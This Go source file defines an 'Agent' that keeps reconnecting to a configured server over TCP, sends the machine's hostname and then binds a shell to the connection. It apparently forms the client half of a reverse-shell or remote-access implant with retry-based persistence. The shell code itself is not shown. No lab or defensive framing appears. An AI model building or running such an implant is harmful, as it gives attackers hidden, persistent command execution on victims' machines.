package core

import (
    "fmt"
    "net"
    "os"
    "time"
)

type Agent struct {
    serverAddr string
    conn       net.Conn
    hostname   string
}

func NewAgent(serverAddr string) *Agent {
    hostname, _ := os.Hostname()
    return &Agent{
        serverAddr: serverAddr,
        hostname:   hostname,
    }
}

func (a *Agent) Run() {
    for {
        if err := a.connect(); err != nil {
            fmt.Printf("[!] Connection error: %v, retry in 10s\n", err)
            time.Sleep(10 * time.Second)
            continue
        }
        
        a.handleConnection()
        a.conn.Close()
        time.Sleep(5 * time.Second)
    }
}

func (a *Agent) connect() error {
    conn, err := net.Dial("tcp", a.serverAddr)
    if err != nil {
        return err
    }
    a.conn = conn
    return nil
}

func (a *Agent) handleConnection() {
    a.conn.Write([]byte(a.hostname + "\n"))
    
    shell := NewShell(a.conn)
    shell.Run()
}
